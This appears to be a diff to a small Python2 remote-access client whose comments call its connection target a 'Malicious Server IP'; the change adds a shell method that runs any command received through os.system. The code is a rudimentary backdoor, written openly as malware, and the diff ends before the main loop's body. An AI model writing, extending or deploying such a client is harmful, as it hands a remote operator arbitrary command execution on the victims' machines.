@@ -2,7 +2,7 @@
 #  by Landon in Python2
 #    CLIENT-SIDE C0DE
 
-import socket
+import socket, os
 
 bigBro = '127.0.0.1' # Malicious Server IP.
 
@@ -10,8 +10,11 @@ clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 clientSocket.connect(( bigBro, 8080 )) # To-do: Change port later. 
 
 class commands:
-    def log( output ):
+    def log( output ): # Outputs to console.
         print( output )
+
+    def shell(command):
+        os.system(command)
 
 turnedOn = True
 while turnedOn:
